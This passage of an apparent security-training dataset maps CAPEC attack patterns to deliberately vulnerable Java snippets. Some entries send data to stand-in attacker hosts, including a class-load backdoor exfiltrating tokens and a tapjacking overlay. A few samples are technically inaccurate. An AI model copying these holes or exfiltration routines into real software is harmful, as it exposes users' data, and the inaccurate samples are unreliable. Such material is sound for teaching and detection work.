        "code_snippet": "public class EntityExpander {\n    public static String expandEntity(String input) {\n        // Define a huge entity\n        StringBuilder entity = new StringBuilder();\n        for (int i = 0; i < 1000000; i++) {\n            entity.append(\"A\");\n        }\n        String largeEntity = entity.toString();\n\n        // Create a map to store entities\n        Map<String, String> entities = new HashMap<>();\n        entities.put(\"&large;\", largeEntity);\n\n        // Perform substitution without limits\n        StringBuilder result = new StringBuilder();\n        String content = \"&large;&large;&large;&large;&large;\";\n        \n        while (content.contains(\"&large;\")) {\n            content = content.replace(\"&large;\", entities.get(\"&large;\"));\n            result.append(content);\n        }\n        \n        return result.toString();\n    }\n}",
        "description": "This vulnerable code demonstrates an entity expansion attack where a large entity is defined and repeatedly substituted without any memory limits or checks. The code violates resource allocation controls (CWE-770) and sequential memory allocation limits (CWE-1325) by allowing unbounded expansion of entities. The substitution process can lead to exponential memory growth and eventual denial of service."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "public class RegexValidator {\n    private static final String EMAIL_PATTERN = \"([a-zA-Z0-9_\\\\.-]+)@([a-zA-Z0-9_\\\\.-]+)\\.([a-zA-Z]{2,})\";  \n\n    public static boolean validateEmail(String input) {\n        Pattern pattern = Pattern.compile(EMAIL_PATTERN);\n        Matcher matcher = pattern.matcher(input);\n        return matcher.matches();\n    }\n\n    public static void main(String[] args) {\n        String maliciousInput = \"a@a.com@a.com@a.com@a.com@a.com@a.com@a.com@a.com@a.com@a.com\";\n        validateEmail(maliciousInput);  // Will cause excessive backtracking\n    }\n}",
        "description": "This code demonstrates a vulnerable regular expression implementation for email validation. The regex pattern is susceptible to catastrophic backtracking when processing malicious input with multiple @ symbols, leading to exponential time complexity and potential denial of service. The pattern lacks proper anchors (^ and $) and is overly permissive, allowing malformed email addresses to be processed."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "public class VulnerableSoapWebService {\n    @WebMethod\n    public String processArrayRequest(@WebParam(name=\"data\") String[] inputArray) {\n        try {\n            // No validation of array size before allocation\n            Object[] processedArray = new Object[inputArray.length];\n            \n            // Process each element without memory checks\n            for (int i = 0; i < inputArray.length; i++) {\n                Document doc = DocumentBuilderFactory.newInstance()\n                    .newDocumentBuilder()\n                    .parse(new InputSource(new StringReader(inputArray[i])));\n                    \n                // Store processed XML in memory without size restrictions\n                processedArray[i] = doc;\n            }\n            \n            return \"Processed \" + processedArray.length + \" elements\";\n        } catch (Exception e) {\n            return \"Error processing request\";\n        }\n    }\n}",
        "description": "This vulnerable SOAP web service accepts an array input without size validation, allowing an attacker to specify extremely large arrays that can exhaust server memory. It also processes XML content without external entity restrictions and maintains all processed data in memory, making it susceptible to XML entity expansion and memory exhaustion attacks."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "public class NetworkServer {\n    private ServerSocket serverSocket;\n    private List<Socket> connections = new ArrayList<>();\n\n    public void startServer(int port) {\n        try {\n            serverSocket = new ServerSocket(port);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                connections.add(clientSocket);\n                \n                // Vulnerable: No limit on number of connections\n                new Thread(() -> {\n                    try {\n                        byte[] buffer = new byte[65535]; // Large buffer for fragmented packets\n                        InputStream in = clientSocket.getInputStream();\n                        \n                        // Vulnerable: Doesn't properly validate TCP fragments\n                        while (in.read(buffer) != -1) {\n                            // Process packet without checking TCP flags or fragmentation\n                            processPacket(buffer);\n                        }\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processPacket(byte[] data) {\n        // Vulnerable: No validation of TCP fragments or flags\n        // Direct processing of potentially fragmented data\n        try {\n            String payload = new String(data);\n            // Process the payload without proper reconstruction or validation\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates vulnerability to TCP Fragmentation attacks by not implementing proper packet fragment handling or validation. It lacks resource limits on connections (CWE-770), doesn't properly validate TCP headers and fragments, and processes network data without proper reconstruction of fragmented packets. The server accepts unlimited connections and processes packets without proper TCP flag validation, making it susceptible to fragment-based evasion techniques."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "public class UDPServer {\n    private DatagramSocket socket;\n    private byte[] buffer;\n    private Map<String, List<byte[]>> fragCache;\n\n    public UDPServer() throws SocketException {\n        socket = new DatagramSocket(9000);\n        buffer = new byte[65507]; // Max UDP packet size\n        fragCache = new HashMap<>();\n    }\n\n    public void listen() {\n        while (true) {\n            try {\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                socket.receive(packet);\n                \n                // No limit on number of fragments stored per client\n                String clientKey = packet.getAddress().toString() + packet.getPort();\n                List<byte[]> fragments = fragCache.computeIfAbsent(clientKey, k -> new ArrayList<>());\n                \n                // Store fragment without size checking\n                byte[] data = Arrays.copyOf(packet.getData(), packet.getLength());\n                fragments.add(data);\n                \n                // Attempt to reassemble fragments without timeout or memory limits\n                if (fragments.size() > 0) {\n                    processFragments(fragments);\n                }\n            } catch (IOException e) {\n                // Silent catch - continues without cleanup\n            }\n        }\n    }\n\n    private void processFragments(List<byte[]> fragments) {\n        // Process all fragments without size validation\n        byte[] assembled = new byte[fragments.stream().mapToInt(f -> f.length).sum()];\n        // No cleanup of processed fragments\n    }\n}",
        "description": "This code demonstrates a vulnerable UDP server that improperly handles IP fragmentation. It has no limits on fragment storage per client, no timeout mechanism for incomplete fragments, no resource cleanup, and no protection against memory exhaustion. The server blindly accepts and stores all incoming fragments without validation, making it susceptible to UDP fragmentation attacks that can exhaust server resources."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "public class ICMPFragmentationHandler {\n    private List<byte[]> fragmentBuffer = new ArrayList<>();\n    private static final int MAX_FRAGMENTS = Integer.MAX_VALUE;\n\n    public void processICMPFragment(byte[] fragment, int fragmentSize) {\n        // No limit on buffer size or fragment count\n        while(true) {\n            fragmentBuffer.add(Arrays.copyOf(fragment, fragmentSize));\n            \n            // Attempt to reassemble fragments without size validation\n            if(fragment[0] == 0x08) { // ICMP Echo Request\n                byte[] reassembledPacket = new byte[fragmentSize * fragmentBuffer.size()];\n                int offset = 0;\n                for(byte[] frag : fragmentBuffer) {\n                    System.arraycopy(frag, 0, reassembledPacket, offset, frag.length);\n                    offset += frag.length;\n                }\n            }\n        }\n    }\n\n    public void sendICMPResponse(byte[] data) {\n        // Transmit ICMP response in cleartext without proper resource cleanup\n        Socket socket = null;\n        try {\n            socket = new Socket(\"target\", 0);\n            OutputStream out = socket.getOutputStream();\n            out.write(data);\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates an ICMP fragmentation handling system that is susceptible to resource exhaustion attacks. It contains multiple vulnerabilities: unlimited allocation of resources for fragment storage (CWE-770), lack of proper resource cleanup for network sockets (CWE-404), cleartext transmission of ICMP data (CWE-319), and improper handling of fragment reassembly that could lead to buffer overlaps (CWE-1316). The infinite loop in fragment processing could cause the system to become non-responsive when processing malicious ICMP fragments."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "public class ConfigurationManager {\n    public static void loadConfiguration(String userSuppliedPath) {\n        String configPath = userSuppliedPath + \"/config/\";\n        File configFile = new File(configPath + \"security.conf\");\n        File aclFile = new File(configPath + \"access.acl\");\n        \n        if(configFile.exists()) {\n            try {\n                FileInputStream fis = new FileInputStream(configFile);\n                Properties props = new Properties();\n                props.load(fis);\n                fis.close();\n            } catch(IOException e) {\n                e.printStackTrace();\n            }\n        }\n        \n        if(aclFile.exists()) {\n            try {\n                BufferedReader reader = new BufferedReader(new FileReader(aclFile));\n                String line;\n                while((line = reader.readLine()) != null) {\n                    processACLEntry(line);\n                }\n                reader.close();\n            } catch(IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    \n    private static void processACLEntry(String entry) {\n        // Process ACL entry\n    }\n}",
        "description": "This vulnerable code accepts an untrusted user-supplied path to load configuration and ACL files. It exposes sensitive configuration and ACL files by not performing proper access control checks, allows path traversal through unsanitized user input, and relies on predictable file locations that can be probed by attackers. The code directly accesses files based on user input without validation or proper security measures."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "public class ScreenshotManager {\n    private String sensitiveUserData;\n    private boolean isInBackground = false;\n\n    public void onAppBackground() {\n        isInBackground = true;\n        // Insecurely storing sensitive data in memory while app is backgrounded\n        saveScreenshotWithSensitiveData();\n    }\n\n    private void saveScreenshotWithSensitiveData() {\n        try {\n            String filename = \"/sdcard/app_screenshots/screen_\" + System.currentTimeMillis() + \".jpg\";\n            FileOutputStream fos = new FileOutputStream(filename);\n            // Writing sensitive data to screenshot\n            sensitiveUserData = \"SSN: 123-45-6789\\nCredit Card: 4111-1111-1111-1111\";\n            // Store screenshot with sensitive data visible\n            fos.write(sensitiveUserData.getBytes());\n            fos.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void handleCustomUrlScheme(String url) {\n        // No URL validation or authentication\n        if(url.startsWith(\"myapp://\")) {\n            accessScreenshots(url);\n        }\n    }\n\n    private void accessScreenshots(String url) {\n        // Direct access to screenshots without proper authorization\n        File screenshotDir = new File(\"/sdcard/app_screenshots/\");\n        for(File screenshot : screenshotDir.listFiles()) {\n            // Transmit screenshots in cleartext\n            sendScreenshotToServer(screenshot);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of sensitive information in iOS screenshots. It stores sensitive user data in screenshots when the app goes to background, doesn't properly secure the storage location, allows unauthorized access through custom URL schemes, and transmits the data in cleartext. The code violates multiple security principles including exposure of private information, improper authorization, and cleartext transmission of sensitive data."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "public class VulnerableActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        \n        String sensitiveData = \"USER_SSN=123-45-6789;CREDIT_CARD=4111-1111-1111-1111\";\n        \n        // Creating an implicit intent with sensitive data\n        Intent intent = new Intent();\n        intent.setAction(\"com.example.SHARE_USER_DATA\");\n        intent.putExtra(\"user_data\", sensitiveData);\n        \n        // Broadcasting sensitive information without protection\n        sendBroadcast(intent);\n    }\n    \n    // Vulnerable Broadcast Receiver\n    public static class DataReceiver extends BroadcastReceiver {\n        @Override\n        public void onReceive(Context context, Intent intent) {\n            if (intent.getAction().equals(\"com.example.SHARE_USER_DATA\")) {\n                String userData = intent.getStringExtra(\"user_data\");\n                // Process received data without verifying source\n                processUserData(userData);\n            }\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities: sending sensitive data through an implicit intent without proper protection, broadcasting sensitive information in cleartext, lack of intent source verification in the broadcast receiver, and no message integrity checking. The exported component can be intercepted by malicious applications, leading to data exposure and potential manipulation."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "public class WebViewHandler {\n    @JavascriptInterface\n    public String getStoredCredentials() {\n        return preferences.getString(\"credentials\", \"\");\n    }\n\n    private void setupWebView() {\n        WebView webView = new WebView(context);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.addJavascriptInterface(this, \"androidInterface\");\n        \n        // Load URL without origin verification\n        webView.loadUrl(\"https://example.com/page\");\n        \n        // Execute arbitrary JavaScript without validation\n        String injectedJS = getIntent().getStringExtra(\"customJS\");\n        webView.evaluateJavascript(injectedJS, null);\n        \n        // Use cookies without validation\n        CookieManager cookieManager = CookieManager.getInstance();\n        cookieManager.setAcceptCookie(true);\n        String authCookie = cookieManager.getCookie(\"https://example.com\");\n        if(authCookie != null) {\n            webView.loadUrl(\"javascript:document.cookie='\"+authCookie+\"';\");\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a WebView implementation that exposes sensitive methods through JavaScript interfaces, allows arbitrary JavaScript injection, fails to verify URL origins, and handles cookies without proper validation. It enables malicious applications to inject code, access sensitive data, and manipulate the DOM tree through the WebView component."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "// Vulnerable Android activity code\npublic class PaymentActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.payment_layout);\n        \n        // Create implicit intent to launch payment processing\n        Intent paymentIntent = new Intent();\n        paymentIntent.setAction(\"com.example.app.PROCESS_PAYMENT\");\n        paymentIntent.putExtra(\"accountNumber\", \"1234567890\");\n        paymentIntent.putExtra(\"amount\", \"1000.00\");\n        \n        // Vulnerable: Using implicit intent for sensitive operation\n        startActivity(paymentIntent);\n    }\n    \n    // Vulnerable broadcast receiver without proper verification\n    public static class PaymentReceiver extends BroadcastReceiver {\n        @Override\n        public void onReceive(Context context, Intent intent) {\n            // Directly processes received intent without verification\n            String accountNumber = intent.getStringExtra(\"accountNumber\");\n            String amount = intent.getStringExtra(\"amount\");\n            processPayment(accountNumber, amount);\n        }\n    }\n}",
        "description": "This vulnerable Android code demonstrates using implicit intents for sensitive payment processing without proper verification of the receiving activity. The code sends sensitive account information through an implicit intent, which can be intercepted by malicious activities. Additionally, the broadcast receiver processes incoming intents without verifying their source, making it susceptible to unauthorized intent injection."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "public class VulnerableDataStorage extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        String action = intent.getAction();\n        if (action.equals(\"com.app.STORE_DATA\")) {\n            String sensitiveData = intent.getStringExtra(\"data\");\n            saveToStorage(sensitiveData);\n        }\n    }\n\n    private void saveToStorage(String data) {\n        SharedPreferences prefs = context.getSharedPreferences(\"app_data\", Context.MODE_WORLD_READABLE);\n        SharedPreferences.Editor editor = prefs.edit();\n        editor.putString(\"sensitive_data\", data);\n        editor.commit();\n    }\n}\n\n// In AndroidManifest.xml\n// <receiver android:name=\".VulnerableDataStorage\" android:exported=\"true\">\n//     <intent-filter>\n//         <action android:name=\"com.app.STORE_DATA\" />\n//     </intent-filter>\n// </receiver>",
        "description": "This code demonstrates a vulnerable Android broadcast receiver that accepts intents without proper verification of the sender. The receiver is publicly exported and processes sensitive data from any incoming intent without authentication. It then stores this data in a world-readable SharedPreferences, making it accessible to other applications. This implementation violates security principles by lacking proper access controls and intent verification, making it susceptible to unauthorized data access and manipulation by malicious applications."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "public class WebAppActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        WebView webView = new WebView(this);\n        webView.getSettings().setJavaScriptEnabled(true);\n\n        class JavaScriptInterface {\n            @JavascriptInterface\n            public String getSystemData() {\n                return System.getProperty(\"user.home\");\n            }\n\n            @JavascriptInterface\n            public void executeCommand(String cmd) {\n                Runtime.getRuntime().exec(cmd);\n            }\n        }\n\n        webView.addJavascriptInterface(new JavaScriptInterface(), \"Android\");\n        webView.loadUrl(\"http://example.com/untrusted-page.html\");\n        setContentView(webView);\n    }\n}",
        "description": "This vulnerable code demonstrates unrestricted registration of JavaScript interfaces in Android WebView. The code exposes sensitive system methods through JavascriptInterface without proper access controls, allowing any loaded webpage to execute system commands and access system data. The WebView loads untrusted content while having dangerous JavaScript interfaces globally accessible."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "public class TaskImpersonator {\n    private static boolean isAdminMode = false;\n\n    public static void main(String[] args) {\n        // Malicious code disguised as system update\n        SwingUtilities.invokeLater(() -> {\n            JFrame frame = new JFrame(\"System Update Required\");\n            JPanel panel = new JPanel();\n            JTextField username = new JTextField(20);\n            JPasswordField password = new JPasswordField(20);\n            JButton updateButton = new JButton(\"Start Update\");\n            \n            updateButton.addActionListener(e -> {\n                String user = username.getText();\n                String pass = new String(password.getPassword());\n                // Stealing credentials\n                sendToRemoteServer(user, pass);\n                \n                if(elevatePrivileges(user, pass)) {\n                    isAdminMode = true;\n                    executePayload();\n                }\n            });\n            \n            panel.add(new JLabel(\"Username:\"));\n            panel.add(username);\n            panel.add(new JLabel(\"Password:\"));\n            panel.add(password);\n            panel.add(updateButton);\n            frame.add(panel);\n            frame.setSize(300, 200);\n            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n            frame.setVisible(true);\n        });\n    }\n    \n    private static void sendToRemoteServer(String user, String pass) {\n        // Code to exfiltrate credentials\n    }\n    \n    private static boolean elevatePrivileges(String user, String pass) {\n        // Attempt to gain elevated system access\n        return true;\n    }\n    \n    private static void executePayload() {\n        if(isAdminMode) {\n            // Execute malicious actions with elevated privileges\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a malicious application that impersonates a system update dialog to steal user credentials and elevate privileges. It creates a deceptive UI that tricks users into entering their credentials, which are then exfiltrated to a remote server. The code lacks proper authorization checks and contains embedded malicious functionality that executes with elevated privileges once credentials are obtained."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "public class CustomURLSchemeHandler {\n    private static final String EXPECTED_APP = \"com.legitimate.app\";\n    private static Map<String, String> registeredHandlers = new HashMap<>();\n\n    public static void registerURLHandler(String scheme, String appId) {\n        registeredHandlers.put(scheme, appId);\n    }\n\n    public static void handleURL(String url, String data) {\n        String scheme = extractScheme(url);\n        String handlerId = registeredHandlers.get(scheme);\n\n        if (handlerId != null) {\n            // No validation of handler legitimacy\n            if (data.contains(\"credentials\")) {\n                String redirectUrl = \"http://malicious-site.com/collect?data=\" + data;\n                processRequest(redirectUrl, data);\n                displayFakeLoginScreen();\n            }\n            System.out.println(\"Processing URL: \" + url + \" with sensitive data: \" + data);\n        }\n    }\n\n    private static void displayFakeLoginScreen() {\n        // Malicious code displaying fake UI\n        JFrame frame = new JFrame(\"Legitimate App Login\");\n        JTextField username = new JTextField(\"Enter username\");\n        JPasswordField password = new JPasswordField();\n        frame.setVisible(true);\n    }\n\n    private static void processRequest(String url, String data) {\n        try {\n            URL requestUrl = new URL(url + \"?sensitiveData=\" + URLEncoder.encode(data, \"UTF-8\"));\n            HttpURLConnection conn = (HttpURLConnection) requestUrl.openConnection();\n            conn.setRequestMethod(\"GET\");\n            conn.connect();\n        } catch (Exception e) {\n            System.out.println(\"Error processing: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a custom URL scheme handler that allows malicious applications to register themselves for URL schemes without proper validation. It includes sensitive data in GET requests, displays fake UI elements to collect user credentials, and redirects data to untrusted sites. The code lacks proper authorization checks and exposes sensitive information in error messages."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "public class MaliciousOverlay extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        \n        // Create transparent overlay window\n        WindowManager.LayoutParams params = new WindowManager.LayoutParams(\n            WindowManager.LayoutParams.MATCH_PARENT,\n            WindowManager.LayoutParams.MATCH_PARENT,\n            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,\n            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |\n            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |\n            WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,\n            PixelFormat.TRANSLUCENT\n        );\n        \n        // Create clickable button that appears part of underlying app\n        Button maliciousButton = new Button(this);\n        maliciousButton.setBackgroundColor(Color.TRANSPARENT);\n        maliciousButton.setLayoutParams(\n            new ViewGroup.LayoutParams(200, 80));\n        maliciousButton.setX(100); // Position over legitimate button\n        maliciousButton.setY(200);\n        \n        maliciousButton.setOnClickListener(v -> {\n            // Send sensitive data when user thinks they're clicking legitimate button\n            String sensitiveData = getSensitiveInformation();\n            sendDataToAttacker(\"http://malicious.com/collect?data=\" + sensitiveData);\n        });\n        \n        WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);\n        wm.addView(maliciousButton, params);\n    }\n    \n    private void sendDataToAttacker(String url) {\n        // Send data in cleartext\n        HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();\n        connection.setRequestMethod(\"GET\");\n        connection.connect();\n    }\n}",
        "description": "This vulnerable code creates a malicious overlay using Android's WindowManager to display a transparent button on top of a legitimate application. The overlay is configured to pass-through touches while intercepting sensitive information. The code demonstrates multiple vulnerabilities including UI misrepresentation (CWE-451), improper UI layer restriction (CWE-1021), and cleartext transmission of sensitive data (CWE-319)."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "public class SensitiveDataStorage {\n    private static final String ENCRYPTION_KEY = \"MyHardcodedKey123\";\n    private static File sensitiveDataFile;\n\n    static {\n        sensitiveDataFile = new File(\"/tmp/sensitive_data.txt\");\n    }\n\n    public static void storeSensitiveData(String data) {\n        try {\n            FileWriter writer = new FileWriter(sensitiveDataFile);\n            writer.write(data);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static String retrieveSensitiveData() {\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(sensitiveDataFile));\n            String data = reader.readLine();\n            reader.close();\n            return data;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n\n    public static void main(String[] args) {\n        String sensitiveInfo = \"User credentials: admin:password123\";\n        storeSensitiveData(sensitiveInfo);\n    }\n}",
        "description": "This code demonstrates multiple physical security vulnerabilities. It stores sensitive data in plaintext in a world-readable temporary directory, uses a hardcoded encryption key, and provides no access controls or authentication mechanisms. The sensitive data is susceptible to unauthorized access by anyone with physical access to the device, and the storage location makes it trivial to extract the information. The code also lacks any protection against side-channel attacks or monitoring of file system operations."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "public class LoginSystem {\n    public static void login() {\n        Console console = System.console();\n        JFrame frame = new JFrame(\"Login\");\n        JPanel panel = new JPanel();\n        JTextField username = new JTextField(20);\n        JPasswordField password = new JPasswordField(20);\n        password.setEchoChar((char)0); // Displays password in plaintext\n\n        panel.add(new JLabel(\"Username:\"));\n        panel.add(username);\n        panel.add(new JLabel(\"Password:\"));\n        panel.add(password);\n\n        JButton loginButton = new JButton(\"Login\");\n        loginButton.addActionListener(e -> {\n            String pwd = new String(password.getPassword());\n            System.out.println(\"Username: \" + username.getText());\n            System.out.println(\"Password: \" + pwd);\n            // Store credentials in plaintext log\n            writeToLog(\"login_attempts.txt\", username.getText() + \":\" + pwd);\n        });\n\n        panel.add(loginButton);\n        frame.add(panel);\n        frame.setVisible(true);\n    }\n\n    private static void writeToLog(String filename, String data) {\n        try {\n            FileWriter fw = new FileWriter(filename, true);\n            fw.write(data + \"\\n\");\n            fw.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues that make it susceptible to shoulder surfing attacks. It displays passwords in plaintext (setEchoChar(0)), logs sensitive credentials to console and file in cleartext, and keeps the login window visible without timeout. This allows attackers to easily observe sensitive information by looking at the screen or log files."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "public class KerberosAuthService {\n    private static final String HASH_ALGO = \"RC4\";\n    private static final int PASSWORD_EXPIRY_DAYS = 365;\n    \n    public boolean authenticateUser(String username, String password) {\n        // Single-factor authentication using simple password\n        String storedTicket = requestServiceTicket(username);\n        String hashedPassword = hashPassword(password);\n        return storedTicket.equals(hashedPassword);\n    }\n    \n    private String requestServiceTicket(String username) {\n        // Store service ticket in plaintext file\n        String ticket = generateKerberosTicket(username);\n        try {\n            FileWriter writer = new FileWriter(\"tickets.txt\", true);\n            writer.write(username + \":\" + ticket + \"\\n\");\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        return ticket;\n    }\n    \n    private String generateKerberosTicket(String username) {\n        // Weak ticket generation using RC4\n        return \"TGT_\" + username + \"_\" + System.currentTimeMillis();\n    }\n    \n    private String hashPassword(String password) {\n        // Weak password hashing using RC4\n        return \"HASH_\" + password;\n    }\n}",
        "description": "This vulnerable code demonstrates weak Kerberos authentication implementation with multiple security flaws: single-factor authentication, insecure storage of service tickets in plaintext, weak RC4-based hashing, no password aging mechanism, and susceptibility to replay attacks. Service tickets are stored locally without proper encryption, making them vulnerable to extraction and offline cracking attempts."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "public class CloudSessionManager {\n    private static String sessionToken;\n    private static boolean isAuthenticated = false;\n\n    public static void authenticateUser(String username, String password) {\n        // Simulating successful authentication\n        isAuthenticated = true;\n        sessionToken = \"user_session_\" + System.currentTimeMillis();\n    }\n\n    public static boolean performCloudAction(String action, String data) {\n        // Vulnerable: No origin validation or proper authorization checks\n        if (sessionToken != null) {\n            // Blindly trusts the session token without verifying its origin\n            // or validating if the action is authorized for this session\n            executeCloudAction(action, data);\n            return true;\n        }\n        return false;\n    }\n\n    private static void executeCloudAction(String action, String data) {\n        // Vulnerable: Client-side security enforcement\n        if (isAuthenticated) {\n            // Executes any action without proper authorization checks\n            System.out.println(\"Executing: \" + action + \" with data: \" + data);\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable cloud session management system that fails to properly validate the origin of requests and relies on client-side security enforcement. It maintains a session token without proper verification, allowing malicious applications to piggyback on authenticated sessions and execute unauthorized actions. The code lacks proper authorization checks and assumes that possession of a session token implies legitimate access rights."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "public class IDEBackdoor {\n    private static final String DEBUG_TOKEN = \"sk_live_123456789\";\n    private static final String SERVER_URL = \"http://malicious-server.com/exfil\";\n    \n    public static void initializeIDE() {\n        try {\n            File debugLog = new File(\"debug.log\");\n            FileWriter writer = new FileWriter(debugLog, true);\n            writer.write(\"IDE Token: \" + DEBUG_TOKEN + \"\\n\");\n            writer.write(\"System Info: \" + System.getProperties() + \"\\n\");\n            writer.close();\n            \n            uploadFile(debugLog);\n        } catch (Exception e) {\n            // Suppress exceptions to avoid detection\n        }\n    }\n    \n    public static boolean uploadFile(File file) {\n        try {\n            URL url = new URL(SERVER_URL);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setDoOutput(true);\n            conn.setRequestMethod(\"POST\");\n            \n            try (OutputStream os = conn.getOutputStream()) {\n                Files.copy(file.toPath(), os);\n            }\n            return conn.getResponseCode() == 200;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n    \n    static {\n        // Malicious code executed when class is loaded\n        new Thread(() -> {\n            while(true) {\n                initializeIDE();\n                try { Thread.sleep(3600000); } catch(Exception e) {}\n            }\n        }).start();\n    }\n}",
        "description": "This vulnerable code demonstrates a malicious backdoor in an IDE that logs sensitive information (including API tokens and system properties) to a debug file and automatically uploads it to a remote server. It includes embedded malicious code in a static initializer, exposes sensitive system information, and implements unrestricted file upload capabilities. The code runs continuously in the background, periodically exfiltrating data while suppressing any error messages to avoid detection."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "public class DeviceController {\n    private static final ThirdPartyHardwareComponent component;\n    private static final int BASELINE_VOLTAGE = 3300; // 3.3V\n    \n    static {\n        component = ThirdPartyHardwareComponent.getInstance();\n        // No verification of component authenticity or integrity\n    }\n    \n    public void calibrateSystem() {\n        int voltage = component.getVoltage();\n        int clockSpeed = component.getClockSpeed();\n        \n        // Blindly trust component readings without validation\n        systemSettings.setVoltage(voltage);\n        systemSettings.setClockSpeed(clockSpeed);\n        \n        // No voltage glitch detection\n        component.executeSecureOperation(sensitiveData);\n    }\n    \n    public void updateFirmware(byte[] newFirmware) {\n        // No way to update or patch the component\n        throw new UnsupportedOperationException(\"Component cannot be updated\");\n    }\n}",
        "description": "This code represents a vulnerable device controller that relies on an unverified third-party hardware component. The code blindly trusts component readings without validating authenticity or integrity, lacks voltage glitch protection, and contains no mechanism to update the component. It also exposes sensitive data through hardware operations without protecting against microarchitectural side-channel attacks."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "public class ProductDocumentation {\n    private static final String RESTRICTED_FEATURES_FILE = \"restricted_features.dat\";\n    private static boolean isDialDownEnabled = false;\n\n    public static void loadProductFeatures(String customerRegion) {\n        try {\n            // Insecure document loading without validation\n            FileInputStream fis = new FileInputStream(RESTRICTED_FEATURES_FILE);\n            Properties props = new Properties();\n            props.load(fis);\n            \n            // No verification of document integrity\n            String featureLevel = props.getProperty(\"technology.level\");\n            boolean isRestricted = Boolean.parseBoolean(props.getProperty(\"restricted\"));\n            \n            // Vulnerable dial-down logic that can be bypassed\n            if (isRestricted && customerRegion.equals(\"RESTRICTED\")) {\n                isDialDownEnabled = true;\n                System.out.println(\"Features dialed down\");\n            } else {\n                // Full feature access regardless of restrictions\n                enableAllFeatures();\n            }\n            \n        } catch (Exception e) {\n            // Silent failure allows fallback to unrestricted mode\n            enableAllFeatures();\n        }\n    }\n    \n    private static void enableAllFeatures() {\n        isDialDownEnabled = false;\n        // Directly expose advanced features without proper checks\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of product documentation and feature control. It loads feature restrictions from an unprotected file, lacks proper validation of documentation integrity, and implements a weak dial-down mechanism that can be easily bypassed. The code exposes sensitive feature controls and fails silently to an unrestricted state, allowing unauthorized access to advanced features that should be restricted."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
